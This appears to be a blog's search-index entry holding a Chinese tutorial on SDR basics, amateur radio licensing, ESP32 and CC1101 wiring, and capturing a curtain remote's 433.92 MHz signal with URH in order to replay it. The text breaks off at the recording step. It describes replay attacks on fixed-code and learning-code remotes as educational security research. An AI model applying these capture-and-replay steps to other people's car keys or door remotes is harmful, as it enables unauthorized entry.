<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>无线电安全-RTLSDR配合CC1101分析重放遥控信号</title>
    <link href="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/"/>
    <url>/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="无线电安全-RTLSDR配合CC1101分析和重放遥控信号"><a href="#无线电安全-RTLSDR配合CC1101分析和重放遥控信号" class="headerlink" title="[无线电安全]RTLSDR配合CC1101分析和重放遥控信号"></a>[无线电安全]RTLSDR配合CC1101分析和重放遥控信号</h1><h2 id="SDR介绍"><a href="#SDR介绍" class="headerlink" title="SDR介绍"></a>SDR介绍</h2><p><a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%97%A0%E7%BA%BF%E7%94%B5">软件无线电-Wiki</a></p><p>SDR是软件定义无线电的缩写，指将无线电系统中的信号处理功能（如通信协议的实现、信号的调制解调和频谱分析等）通过<strong>基于软件的数字信号处理</strong>来实现，少部分模拟信号处理和数模转换功能通过<strong>通用硬件</strong>实现。SDR的原理：通用硬件接收到模拟信号并转换成数字信号，数字信号由软件处理，处理完后软件输出要发射的数字信号，数字信号由通用硬件转换为模拟信号并发射。相比于传统的全硬件无线电，软件无线电可以不修改硬件，仅修改软件实现多种不同的无线协议或标准，具有灵活性强、开放性强、兼容性强、硬件成本低的优点。对于无线电技术爱好者，SDR既能满足DIY研究技术的需求，又能省去大量的专用设备购买成本。</p><p><strong>SDR可以干什么</strong></p><p>SDR的应用于航天、军事、工业、消费电子产品、多媒体等各个领域，产品包括：手机、电脑、无人机、汽车、智能家居、网络设备、传感器、工控机、移动通信、卫星通信、无线电广播和电视等。从无线技术的类别来分，包括：近场通信NFC、蓝牙BLE、射频RFID、工控无线传输ZigBee、无线局域网WiFi、卫星定位GPS、卫星通信SATCOM、手机蜂窝网络Cellular、航空无线电ADS-B等。</p><p>从安全攻防的角度来看，SDR可以涵盖无线通信安全的大部分内容，比如：跟踪商用飞机轨迹和航班信息、搭建伪基站、GSM窃听、GPS欺骗、捕获分析重放遥控器信号以及其它各类无线协议的分析和攻击。攻击手段主要有4种：监听、重放、欺骗、劫持。 </p><p><strong>需要哪些前置知识</strong></p><ul><li>通信原理</li><li><strong>通信系统</strong></li><li>数字信号处理</li><li><strong>调制与解调</strong></li><li>信号与系统</li></ul><p><strong>SDR硬件</strong></p><p>常见SDR硬件：HackRF、RTL-SDR、BladeRF、USRP、LimeSDR、PlutoSDR、Airspy</p><table><thead><tr><th>设备名称</th><th>工作频率</th><th>全&#x2F;半双工</th><th>价格</th></tr></thead><tbody><tr><td>HackRF One</td><td>1MHz到6GHz</td><td>Rx+Tx</td><td>500-1000元</td></tr><tr><td>RTL-SDR(R820T&#x2F;R860&#x2F;R828D)</td><td>24MHz-1.76GHz</td><td>Rx</td><td>80-300元</td></tr><tr><td>BladeRF</td><td>300MHz-3.8GHz</td><td>Rx+Tx</td><td>500-10000元</td></tr><tr><td>USRP系列</td><td>取决于具体型号，所有设备涵盖直流电至6GHz，见<a href="https://www.ni.com/en-us/shop/category/software-defined-radios.html">官网</a></td><td>Rx+Tx</td><td>2000-20w元</td></tr><tr><td>LimeSDR</td><td>有Mini2.0、XTRX、X3三个型号，最高3.8GHz，见<a href="https://limemicro.com/sdr/">官网</a></td><td>Rx+Tx</td><td>$400&#x2F;800&#x2F;20000</td></tr><tr><td>PlutoSDR(ADALM-PLUTO)</td><td>325MHz-3.8GHz(可提升至70MHz-6GHz:<a href="https://0x0root.com/2017/11/29/plutosdr-getting-started/">参考</a>)</td><td>Rx+Tx</td><td>$195(淘宝1000元左右)</td></tr><tr><td>Airspy(Mini&#x2F;R2&#x2F;HF+)</td><td>24-1700MHz</td><td>Rx</td><td>$99&#x2F;169(淘宝1000元左右)</td></tr></tbody></table><p>SDR硬件主要包含天线、射频前端、数模转换器和用于执行数字功能的FPGA或SoC。对于半双工的SDR，可以添加射频前端模组对其功能进行拓展。虽然SDR的理念是软件替代硬件，但有时也需要依赖额外的硬件实现特定功能(比如接收ADS-B信号)，开发能力强的话也可以DIY自己的SDR设备。</p><p><strong>SDR软件</strong></p><p>常见SDR软件：GNU Radio、SDR++、GQRX、SDR#、MATLAB、Simulink、SoapySDR、PothosSDR、PySDR。</p><p>结合硬件和目标应用选择软件。</p><h2 id="业余无线电介绍"><a href="#业余无线电介绍" class="headerlink" title="业余无线电介绍"></a>业余无线电介绍</h2><p>业余无线电是一种在全世界非常普遍的业余爱好，业余无线电爱好者又被称为HAM。根据Wiki的数据，截至2024年，中国有24万左右HAM，美国有75万左右HAM，全世界有三至四百万HAM。搞无线电涉及到安全和法律的问题，受各国政府严格管控，因此“准”业余无线电爱好者需要经过考试才能得到业余无线电执照，有了执照才能合法开展业余无线电活动，成为真正的HAM。不同国家有不同的业余无线电执照和相应制度。</p><p>在中国，执照分为<strong>中国无线电协会业余电台操作证书</strong>（简称“操作证书”）和<strong>中华人民共和国无线电台执照</strong>（简称“业余电台执照”）两个部分。</p><ul><li><p>操作证书分为A类、B类和C类，是业余无线电爱好者个人的操作技术能力的证明，也是使用业余无线电台的许可。</p><p>统一在CRAC官网进行考试报名和信息查询。A类和B类考试由各省的考试机构自行组织，C类考试由CRAC统一组织。</p><p>操作证书由<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E6%97%A0%E7%BA%BF%E7%94%B5%E5%8D%8F%E4%BC%9A%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5%E5%88%86%E4%BC%9A">中国无线电协会业余无线电分会</a>（简称CRAC）负责核发，在全国范围通用，并且终身有效。</p><p>初次申领者不限年龄，但只能参加A类考试；取得A类操作证书取得业余无线电台执照6个月以上可以参加B类考试；取得B类操作证书并取得载明30MHz以下频段的业余无线电台执照18个月以上可以参加C类考试。</p><p>详情参见《业余无线电台管理办法》第三章及CRAC官网。</p></li><li><p>业余电台执照是设置业余无线电台的许可，证明你的电台是合法的。 </p><p>需要取得操作证书后才能申请对应频率的设备的业余电台执照，参考对照表如图。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250113110936.png" alt="QQ截图20250113110936"></p><p>对于没有呼号的申请者，无线电管理机构颁发业余无线电台执照时会同时核发业余无线电台呼号。业余无线电操作员在无线电通信中以“呼号”唯一地表明自己或台站的身份。</p><p>除了有型号核准的无线电发射设备，也可以申请自制、改装、 拼装等未取得型号核准的设备，但是需要提交额外的说明材料并经过检验。</p><p>详情参见《业余无线电台管理办法》第二章及CRAC官网。</p></li></ul><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5">业余无线电-Wiki</a></p><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5%E7%88%B1%E5%A5%BD%E8%80%85">业余无线电爱好者 - Wiki</a></p><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5%E6%89%A7%E7%85%A7%E5%88%B6%E5%BA%A6">中华人民共和国业余无线电执照制度 - Wiki</a></p><p><a href="https://www.gov.cn/gongbao/2024/issue_11286/202404/content_6945591.html">中华人民共和国业余无线电台管理办法</a></p><p><a href="http://crac.org.cn/">中国无线电协会业余无线电分会官网</a></p><p>无线电相关的政策查询、频率划分查询、认证考试、备考刷题和模拟考试都可以在<strong>智谱APP</strong>上进行。</p><p>此外，还可以关注各地区的<strong>无线电协会公众号</strong>，HAM会举办各类的活动例如跳蚤市场、聚会、比赛等。</p><h2 id="无线电频率划分"><a href="#无线电频率划分" class="headerlink" title="无线电频率划分"></a>无线电频率划分</h2><p>无线电波的频率范围：0~3000GHz。无线电频率的划分非常复杂，涉及到地区、国家、部门、业务和应用等因素，这里不赘述。</p><p>了解特定业务频率范围可以查阅最新政策文件：<a href="http://www.crac.org.cn/userfiles/file/20240419/20240419164801_9782.pdf">《中华人民共和国无线电频率划分规定》（2023版）</a></p><p>也可以参考较新的野生资料：<a href="https://zhuanlan.zhihu.com/p/684488623">2024最全无线通信频率分配</a></p><p>其它常见无线电频率补充：</p><ul><li><p>无线电遥控器：27Mhz、315MHZ、330MHZ、350MHZ、390MHZ、418MHZ、430MHZ、433.92MHZ、915MHz、2.4GHz。</p></li><li><p>广播与电视：</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250114021525.png" alt="QQ截图20250114021525"></p></li><li><p>对讲机&#x2F;电台：频率越高，穿透力越强，抗干扰能力越弱，成本越高。</p><p>民用对讲机(公众无线电)</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs subunit">专业对讲机：V段136<span class="hljs-string">-174</span>MHZ，U段400<span class="hljs-string">-470</span>MHZ<br>民用对讲机(公众无线电)：409<span class="hljs-string">-410</span>MHz<br>武警公安用：350<span class="hljs-string">-390</span>MHZ<br>海岸用：220MHZ<br>交通信号灯监控、防空警报器：223.025<span class="hljs-string">-235</span>Mhz<br>业余无线电：V段144.000<span class="hljs-string">-145</span>.800MHz，U段430.000<span class="hljs-string">-435</span>.000MHz和438.000<span class="hljs-string">-440</span>.000MHz<br>集群用：800MHZ<br>手机：900MHZ/180MHZ<br></code></pre></td></tr></table></figure><p>民用对讲机，我国频段是409-410MHz，欧美国家分462MHz和467MHz两组</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250114024858.png" alt="QQ截图20250114024858"></p></li><li><p>蜂窝网络(Cellular network)：主流蜂窝网络包括GSM、UMTS&#x2F;HSPA(3G)、LTE&#x2F;LTE-A(4G)、NR(5G)。安卓手机可以用Cellular-Z APP测试蜂窝信号。具体不同网络和不同供应商的频率划分参考上文的野生资料。</p></li></ul><h2 id="全双工SDR系统搭建"><a href="#全双工SDR系统搭建" class="headerlink" title="全双工SDR系统搭建"></a>全双工SDR系统搭建</h2><h3 id="软硬件介绍"><a href="#软硬件介绍" class="headerlink" title="软硬件介绍"></a>软硬件介绍</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">硬件：<br>RTL<span class="hljs-built_in">-SDR</span>(R820T2调谐器+RTL2832U解调器+天线)<br>ESP32-WROOM-<span class="hljs-number">32</span>开发板<br>E07-M1101D <span class="hljs-number">443</span>M射频模块<br>软件：<br>Universal Radio Hacker（URH）<br></code></pre></td></tr></table></figure><h4 id="RTL-SDR-R820T-RTL2832U-天线"><a href="#RTL-SDR-R820T-RTL2832U-天线" class="headerlink" title="RTL-SDR(R820T+RTL2832U+天线)"></a>RTL-SDR(R820T+RTL2832U+天线)</h4><p>廉价，能够实现较大频率范围的无线信号接收，但没有发送信号的功能。有V3、V4等较新的型号，频率和基本功能不变，优化了稳定性、发热问题等细节。</p><p>用途1：接收DVB-T电视(在国外有DAB-T格式电视的地区)、FM广播、<a href="https://blog.csdn.net/u011468564/article/details/139192584">ADS-B</a>等。</p><p>用途2：作为SDR使用，可以接收24MHz-1.7GHz的无线电信号。</p><h4 id="射频模块和主控"><a href="#射频模块和主控" class="headerlink" title="射频模块和主控"></a>射频模块和主控</h4><p>由于RTL-SDR不具有发射功能，还需要通过<code>主控+CC1101射频模块</code>实现无线信号的发射，参考**<a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a>**项目，HackRF的射频发送功能也采用该方案。CC1101也能接收信号，但是和SDR软件不兼容，分析信号不方便，并且工作频率范围是387.0MHz～464.0MHz，远不如专门的SDR硬件。</p><p>主控用于烧入程序控制整个系统的交互。主控有很多选项，包括ESP32、Arduino Pro Micro、ESP8266、STM32、Arduino-NANO等。笔者用的是ESP32-WROOM-32。</p><p><a href="https://openatomworkshop.csdn.net/67404e223a01316874d7390e.html">ESP-WROOM-32开发板介绍</a></p><p>CC1101无线芯片是一款国际大厂TI德州仪器（Texas Instruments）研发的低功耗无线传输芯片，能够工作在315、433、868和915MHz频段。淘宝上买到的开发板主要有TI-CC1101、M1101D系列。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/Wiring_CC1101.png" alt="Wiring_CC1101"></p><h4 id="Universal-Radio-Hacker-URH"><a href="#Universal-Radio-Hacker-URH" class="headerlink" title="Universal Radio Hacker(URH)"></a>Universal Radio Hacker(URH)</h4><p>一个用于逆向解析无线通信协议的开源工具。发表在12th USENIX Workshop on Offensive Technologies（woot’18）会议。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">通用无线电黑客 <span class="hljs-comment">(URH)</span> 是一套完整的无线协议调查工具，原生支持多种常见的软件定义无线电。URH 可以轻松解调信号，并自动检测调制参数，从而可以轻松识别空中传输的比特和字节。由于数据通常在传输前进行编码，URH 提供可自定义的解码，甚至可以破解 CC<span class="hljs-number">1101</span> 数据白化等复杂编码。在协议逆向工程方面，URH 有两种用途。您可以手动分配协议字段和消息类型，也可以让 URH使用基于规则的智能自动推断协议字段。最后，URH 包含一个针对无状态协议的模糊测试组件和一个用于有状态攻击的模拟环境。<br></code></pre></td></tr></table></figure><p><a href="https://www.usenix.org/conference/woot18/presentation/pohl">论文和ppt</a>  <a href="https://github.com/jopohl/urh">github仓库</a>  <a href="https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf">操作使用手册</a></p><h3 id="E07-M1101D-ESP32配置"><a href="#E07-M1101D-ESP32配置" class="headerlink" title="E07-M1101D + ESP32配置"></a>E07-M1101D + ESP32配置</h3><p><strong>接线</strong></p><p>E07-M1101D无线收发模块各引脚含义及与主控的接线方式如图。</p><p>图片来自<a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a>中的<code>E07-M1101D-SMA_Usermanual_EN_v1.30.pdf</code>。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20241231015017.png" alt="QQ截图20241231015017"></p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20241231014940.png" alt="QQ截图20241231014940"></p><p>笔者买的ESP32-WROOM-32主控的引脚如图。可以看到有H和V两组SPI引脚，E07-M1101D中CSN、SCK、MOSI、MISO四个引脚连接到ESP32上任意一组4线SPI接口即可，两组SPI接口是一样的。GND和VCC不用多说，还剩下GDO2和GDO0两个数据输出接口不知道怎么连。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/tb_image_share_1736332092541.jpg.png" alt="tb_image_share_1736332092541.jpg"></p><p>我们参考ESP8266和CC1101模块，GDO0和GDO2分别连D1和D2引脚。</p><p>图片来自<a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a>中的<code>Esp8266_CC1101.png</code>。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20241231020106.png" alt="QQ截图20241231020106"></p><p>查询ESP8266中D1和D2引脚的作用。如图，分别是SCL和SDA，那么E07-M1101D的GDO0和GDO2分别连接ESP32的<code>I2C_SCL(GPIO22,D22)</code>和<code>I2C_SDA(GPIO21,D21)</code>。</p><p>图片来自<a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a>中的<code>ESP8266_Pinout_Diagrams.pdf</code>。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20241231020239.png" alt="QQ截图20241231020239"></p><p>总结，笔者的设备接线如下：</p><table><thead><tr><th>E07-M1101D 443MHz</th><th>ESP32-WROOM-32</th></tr></thead><tbody><tr><td>引脚1(GND)</td><td>GND</td></tr><tr><td>引脚2(VCC)</td><td>3V3</td></tr><tr><td>引脚3(GDO0)</td><td>D22(I2C_SCL)</td></tr><tr><td>引脚4(CSN)</td><td>D15(HSPI_CS)</td></tr><tr><td>引脚5(SCK)</td><td>D14(HSPI_CLK)</td></tr><tr><td>引脚6(MOSI)</td><td>D13(HSPI_MOSI)</td></tr><tr><td>引脚7(MISO&#x2F;GDO1)</td><td>D12(HSPI_MISO)</td></tr><tr><td>引脚8(GDO2)</td><td>D21(GPIO21,I2C_SDA)</td></tr></tbody></table><p><strong>安装CP2101驱动</strong></p><p>  ESP32-WROOM-32开发板使用CP2102-USB转串口芯片来和外部设备进行串口通信，所以还要安装CP2102的驱动，否则如图无法识别设备。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250108170710.png" alt="QQ截图20250108170710"></p><p><a href="https://www.silabs.com/developer-tools/usb-to-uart-bridge-vcp-drivers?tab=downloads">CP2102驱动下载传送门</a></p><p>下载如下文件并安装驱动</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250108175202.png" alt="QQ截图20250108175202"></p><p>安装完成后可以正常识别</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250108183144.png" alt="QQ截图20250108183144"></p><p><strong>Arduino烧录交互程序至ESP32</strong></p><p><a href="https://github.com/sbusso/cc1101-tool">cc1101-tool项目</a>为我们提供了要烧录到ESP32的串口终端程序，负责处理ESP32、CC1101模块和PC间的交互，使用Arduino IDE进行烧录。</p><p>下载并安装Arduino IDE：<a href="https://www.arduino.cc/en/software">传送门</a></p><p>安装CC1101的依赖库</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250109145646.png" alt="QQ截图20250109145646"></p><p>安装ESP32开发板软件包</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250109145709.png" alt="QQ截图20250109145709"></p><p>Arduino IDE配置完成后选择自己设备对应的ino文件进行烧录。笔者要烧录的是<code>cc1101-tool-esp32-wroom.ino</code>。因为板子有两组SPI接口，笔者接线用的是HSPI，原本代码用VSPI，gdo0和gdo2接线也不同，所以代码中引脚定义部分需要进行修改，如图</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250110134950.png" alt="QQ截图20250110134950"></p><p><strong>连接串口</strong></p><p>用终端仿真工具连接串口，Putty、SecureCRT、MobaXterm等都可以，这里用MobaXterm，波特率设置为代码中的115200，端口选择ESP32的CP2102对应端口。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250110140123.png" alt="QQ截图20250110140123"></p><p>连上后显示Connect OK并且help正常显示命令，配置成功</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250110140558.png" alt="QQ截图20250110140558"></p><h3 id="RTL-SDR和URH配置"><a href="#RTL-SDR和URH配置" class="headerlink" title="RTL-SDR和URH配置"></a>RTL-SDR和URH配置</h3><p><strong>RTL-SDR接线</strong></p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/IMG_20250107_193813.jpg" alt="IMG_20250107_193813"></p><p><strong>RTL-SDR驱动安装</strong></p><p>windows下使用<a href="https://zadig.akeo.ie/">Zadig工具</a>安装对应驱动</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250101003855.png" alt="QQ截图20250101003855"></p><p>插上RTL-SDR，开启<code>Options</code> -&gt; <code>List All Devices</code>。分别选中<code>Bulk-In,Interface 1</code>和<code>Bulk-In,Interface 0</code>接口，分别安装默认的WinUSB驱动。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250114140354.png" alt="QQ截图20250114140354"></p><p><strong>URH安装和使用</strong></p><p><a href="https://github.com/jopohl/urh">URH github仓库</a></p><p>windows平台下载Release中的安装程序安装。几个主要功能如图。一般先频谱分析获取无线电信号的频率，然后记录该频率的信号保存为文件并进行分析。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250114153829.png" alt="QQ截图20250114153829"></p><p>设备选择RTL-SDR，刷新后能识别出设备说明之前驱动安装得没问题。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250114154035.png" alt="QQ截图20250114154035"></p><h2 id="遥控技术安全"><a href="#遥控技术安全" class="headerlink" title="遥控技术安全"></a>遥控技术安全</h2><p>遥控技术主要有红外遥控 、无线电(射频)遥控、蓝牙遥控和WIFI遥控。</p><p>红外遥控(非无线电波)：将遥控信号(二进制脉冲码)，调制在38kHZ的载波上，经过缓冲放大后送至红外发光二极管，转化为红外信号发射出去。红外线的频率不在无线电波范围内，现有大部分SDR平台无法收发红外线信号。部分手机有红外功能，Android也支持红外遥控开发的API，可以配合红外收发模块DIY自己的红外设备。红外遥控通信距离短、无法绕过障碍物，一般只应用于玩具或廉价家电，因此红外遥控安全的研究价值较低。</p><p>蓝牙和WIFI遥控的安全性主要是针对蓝牙和WIFI协议本身。 </p><p>无线电遥控的安全性涉及编码和加密、通信协议等，由专用的编码和解码芯片来实现，主要有固定码、学习码和滚动码三种方案，安全性：滚动码&gt;学习码&gt;固定码。</p><ul><li>固定码：编码固定，所有通信信号不变，易被截获并重放。常见编码芯片有2260、2262、PT2264等，解码芯片有2270、2272、2294等。</li><li>学习码：信号的某部分固定，另一部分可自定义。例如可学习用户指定信号。常见编码芯片有1527、2240、527等，解码一般通过单片机。</li><li>滚动码：每次信号发送都生成新的动态代码，基于一定的同步算法进行匹配(比如AES加密使用随机密钥，发射方和接收方同步生成密钥的种子和时间)，无法直接重放信号。常见编码芯片有HCS301、HCS300、HCS200、HCS101等；解码芯片有TDH6301、TCT6301、SMC400等。</li></ul><p>以上编解码芯片的名称都由字母前缀+数字组成，其中数字代表型号，字母代表品牌。只写数字表示该型号芯片有多个不同品牌。</p><p>无线电遥控的应用：汽车钥匙、车库门遥控器、智能家居设备等，比较常见的频率有315&#x2F;433MHz、868MHz、2.4GHz。</p><p>目前市面上有遥控器频率测试仪、拷贝型遥控器和学习型遥控器(类似于智能卡中的变色龙)，还有集成了识别频率、编码芯片型号、编码类型等参数功能和学习拷贝功能的设备。理论上，识别频率、拷贝并重放信号的操作同样可以通过SDR实现，编码芯片型号的识别则需要研究不同芯片的具体编码特征。针对滚动码遥控的拷贝一般需要通过捕获并分析信号、测信道攻击、逆向编解码芯片的固件等方式，分析编码方式和通信协议并获取关键密钥。</p><h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>测试内容：捕获遥控器的信号并分析后进行重放。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">遥控器型号：杜亚DOOYA DC<span class="hljs-number">2700</span>AC单通道发射器<span class="hljs-comment">(编码芯片未公开)</span><br>频率：<span class="hljs-number">433.92</span>MHz<br>功能：和窗帘电机完成对码后控制窗帘升降<br>按键：<span class="hljs-number">3</span>个<span class="hljs-comment">(窗帘放下、窗帘上升、暂停)</span><br></code></pre></td></tr></table></figure><p>遥控器使用前需要和电机对码，因此大概率是学习码芯片</p><h3 id="确认频率"><a href="#确认频率" class="headerlink" title="确认频率"></a>确认频率</h3><p>进入spectrum analyzer功能，捕获遥控器信号，观察峰值频率为433.92MHz，确认频率。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250123223115.png" alt="QQ截图20250123223115"></p><h3 id="记录信号"><a href="#记录信号" class="headerlink" title="记录信号"></a>记录信号</h3><p>进入Record Signal功能，记录遥控器发出的三种基带数字信号并分别保存为文件</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250123230222.png" 